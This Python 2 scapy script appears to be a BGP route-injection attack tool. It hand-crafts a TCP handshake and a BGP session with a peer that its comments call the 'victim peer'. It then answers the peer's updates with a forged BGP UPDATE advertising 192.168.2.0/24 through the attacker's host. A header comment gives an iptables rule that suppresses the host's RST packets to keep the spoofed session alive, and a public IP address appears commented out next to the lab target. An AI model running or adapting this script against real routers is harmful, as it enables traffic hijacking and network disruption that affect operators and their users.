#!/usr/bin/env python
# -*- coding: utf8 -*-

# TCP flags legend:
# FIN 1
# SYN 2
# RST 4
# PSH 8
# ACK 16
# URG 32

# BGP message types:
# 1 - OPEN
# 2 - UPDATE
# 3 - NOTIFICATION
# 4 - KEEPALIVE


# need to run suppress tcp-rst packets from our machine:
#     sudo iptables -A OUTPUT -p TCP --tcp-flags RST RST -s 10.10.10.2 -j DROP


# bgp state machine:
#
#        Connect  --->  Active 
#         ^                \
#        /                  \
#       /                    v
#    Idle                   Open Sent
#       ^                   /
#        \                 /
#         \               v
#      Established <-- Open Confirmed    


import os
os.sys.path.append('./scapy')

from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.bgp import *

outNic = "ens38"
myIp   = "10.10.10.2"
peerIp = "10.10.10.1" #"170.104.164.236"
srcPort = random.randint(40000, 65535)
randomSeq = int(RandInt())
handshakeOk = False
bgpOpenSent = False
firstKeepAliveSent = False
connected = False


def handlePackets(p):
    global peerIp
    global handshakeOk
    global myIp
    global bgpOpenSent
    global firstKeepAliveSent
    global connected

    if not p.haslayer(IP) or not p.haslayer(TCP):
        #print "[-] not a TCP/IP packet:", p.summary()
        return

    if p[IP].src != peerIp or p[TCP].dport != srcPort:
        #print "[-] TCP packet not from victim peer:", p.summary()
        return

    if p[TCP].flags == 18 and not handshakeOk: 
        print "\n[+] got SYN+ACK packet:", p.summary()
        # got a SYN+ACK, note the peer's seq to use later in BGPOpen and send an ACK now
        ack = Ether() / IP(dst=p[IP].src, id=int(RandShort())) / TCP(sport=p[TCP].dport, dport=p[TCP].sport, ack=p[TCP].seq+1, seq=p[TCP].ack, flags="A")
        print "[i] sending ACK packet:", ack.summary()
        sendp(ack, iface=outNic)	
        handshakeOk = True
        print "\n[+] completed TCP handshake with", peerIp

    if handshakeOk and not bgpOpenSent:
        bgpOpen = Ether() / IP(dst=p[IP].src, id=int(RandShort())) / TCP(sport=p[TCP].dport, dport=p[TCP].sport, ack=p[TCP].seq+1, seq=p[TCP].ack, flags="PA") / BGPHeader(type=1) / BGPOpen(version=4, AS=65002, hold_time=180, bgp_id=myIp)
        print "[i] sending BGPOPEN packet:", bgpOpen.summary()
        sendp(bgpOpen, iface=outNic)
        bgpOpenSent = True

    if bgpOpenSent and p.haslayer(BGPOpen) and not firstKeepAliveSent:
        # got BGPOPEN, acknoledge it and send keepAlive
        print "\n[+] got BGPOPEN from peer:", p.summary()
        pl = BGPHeader(p.getlayer(Raw).load)
        #print "type:", p[BGPHeader].type, "len1:", p[BGPHeader].len, "len2:", pl[BGPHeader].len
        ack2 = Ether() / IP(dst=p[IP].src, id=int(RandShort())) / TCP(sport=p[TCP].dport, dport=p[TCP].sport, ack=p[TCP].seq+p[BGPHeader].len+pl[BGPHeader].len, seq=p[TCP].ack, flags="A")
        print "[i] sending ACK packet:", ack2.summary(), "len:", p[BGPHeader].len
        sendp(ack2, iface=outNic)
        keepAlive = Ether() / IP(dst=p[IP].src, id=int(RandShort())) / TCP(sport=p[TCP].dport, dport=p[TCP].sport, ack=p[TCP].seq+p[BGPHeader].len+pl[BGPHeader].len, seq=p[TCP].ack, flags="PA") / BGPHeader(type=4, len=19)
        print "[i] sending first BGPKEEPALIVE packet:", keepAlive.summary()
        sendp(keepAlive, iface=outNic)
        firstKeepAliveSent = True
        return

    if p.haslayer(BGPHeader) and p[BGPHeader].type == 4:
        # got BGPKEEPALIVE, send keep alive and listen for peer's keep alive 
        print "\n[+] got BGPKEEPALIVE from peer:", p.summary(), "seq:", p[TCP].seq, "ack:", p[TCP].ack
        ack2 = Ether() / IP(dst=p[IP].src, id=int(RandShort())) / TCP(sport=p[TCP].dport, dport=p[TCP].sport, ack=p[TCP].seq+p[BGPHeader].len, seq=p[TCP].ack, flags="A")
        print "[i] sending ACK packet:", ack2.summary()
        sendp(ack2, iface=outNic)
        #if not firstKeepAlive:
        #	keepAlive = Ether() / IP(dst=p[IP].src, id=int(RandShort())) / TCP(sport=p[TCP].dport, dport=p[TCP].sport, ack=p[TCP].seq+p[BGPHeader].len, seq=p[TCP].ack, flags="PA") / BGPHeader(type=4, len=19)
        #	print "[i] sending BGPKEEPALIVE packet:", keepAlive.summary()
        #	sendp(keepAlive, iface=outNic)
        #firstKeepAlive = False

    if p.haslayer(BGPHeader) and p[BGPHeader].type == 3:
        print "\n[+] got BGPNOTIFICATION from peer:", p.summary()

    if p.haslayer(BGPHeader) and p[BGPHeader].type == 2:
        print "\n[+] got BGPUPDATE from peer:", p.summary()
        #update={'TYPE':0,'ORIGIN':'\x00','NEXT_HOP':'\x0a\x0a\x0a\x02','MULTI_EXIT_DISC':'\x00\x00\x00\x00','LOCAL_PREF':'\x00\x00\x00\x96','NLRI':[(24, '192.168.2.0')],'AS_PATH':'65002'}
        #updatePacket = Ether() / IP(dst=p[IP].src, id=int(RandShort())) / TCP(sport=p[TCP].dport, dport=p[TCP].sport, ack=p[TCP].seq+p[BGPHeader].len, seq=p[TCP].ack, flags="PA") / Raw(load=update)
        sendp(Ether() / IP(dst=p[IP].src, id=int(RandShort())) / TCP(sport=p[TCP].dport, dport=p[TCP].sport, ack=p[TCP].seq+p[BGPHeader].len, seq=p[TCP].ack, flags="PA") /
              BGPHeader(type=2) / BGPUpdate(nlri='192.168.2.0/24',
                                            total_path=[BGPPathAttribute(type='ORIGIN', value='\x00'),
                                                        BGPPathAttribute(type='NEXT_HOP', value='\x0a\x0a\x0a\x02'),
                                                        BGPPathAttribute(flags=128L, type='MULTI_EXIT_DISC', value='\x00\x00\x00\x00'),
                                                        BGPPathAttribute(type='LOCAL_PREF', value='\x00\x00\x00\x96'),
                                                        BGPPathAttribute(type='AS_PATH', value=''),
                                                       ]), iface=outNic)			
        #print "[i] sending BGPUPDATE packet:", updatePacket.summary()
        #send(updatePacket)

        
def stopFilter(p):
    if not p.haslayer(TCP):
        return False
   
    if p[TCP].flags == 25 and p[IP].src == peerIp or p[TCP].flags == 4 and p[IP].src == peerIp:
        # if any TCP packet with flags PSH + FIN + ACK or RST
        print "[+] peer", peerIp, "goes Disconnect"
        return True
    else:
        return False

    
def bgpConnect(ipAddr):
    global srcPort
    global randomSeq

    print "[i] trying to connect to", ipAddr

    syn = Ether() / IP(dst=ipAddr, id=int(RandShort())) / TCP(sport=srcPort, dport=179, ack=0, seq=randomSeq, flags="S")
    print "[i] sending SYN packet:", syn.summary()
    sendp(syn, iface=outNic)

    sniff(filter="tcp", stop_filter=stopFilter, store=0, prn=handlePackets)

    print "[i] exiting"


bgpConnect(peerIp)